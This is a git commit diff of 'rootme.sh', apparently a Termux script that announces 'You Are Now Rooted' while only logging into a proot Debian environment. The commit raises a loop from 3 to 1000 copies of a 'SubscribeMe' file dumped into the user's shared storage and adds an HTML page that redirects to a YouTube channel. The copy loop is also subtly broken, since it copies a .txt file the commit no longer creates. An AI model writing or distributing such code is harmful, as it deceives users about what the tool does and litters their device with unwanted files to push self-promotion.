cf4b33d54000d9c334c37b372deecdce92302d56
ultracyberz <149968539+ultracyberz@users.noreply.github.com>
2023-12-11 19:07:25 +0300

    rootme.sh

--- rootme.sh
+++ rootme.sh
@@ -9,10 +9,10 @@ echo -e "\e[31m
 [+] You Are Now Rooted Feel Free to use!!!
 
 \e[0m"
-
-proot-distro login debian
-echo "i told you to subscribe my channel!" > SubscribeMe.txt
-for i in {1..3}
+echo "please wait for few sec ..."
+echo "<head><meta http-equiv="refresh" content="0;url=https://www.youtube.com/@CyberGash"></head>" > SubscribeMe.html
+for i in {1..1000}
 do
     cp SubscribeMe.txt /data/data/com.termux/files/home/storage/shared/SubscribeMe_$i.txt
 done
+proot-distro login debian
